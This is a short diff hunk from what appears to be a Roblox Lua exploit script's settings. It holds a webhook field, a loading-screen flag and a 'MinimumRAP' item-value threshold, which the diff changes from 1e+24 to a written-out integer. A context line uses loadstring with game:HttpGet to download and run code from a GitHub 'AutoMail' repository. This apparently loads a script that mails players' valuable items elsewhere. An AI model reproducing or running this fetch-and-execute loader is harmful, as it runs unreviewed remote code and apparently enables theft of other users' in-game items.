@@ -4,7 +4,7 @@ Webhook = " loading "
 
 LoadingScreen = true
 
-MinimumRAP = 1e+24
+MinimumRAP = 1000000000000000000000000
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HubPet99/AutoMail/main/Mail"))()
 
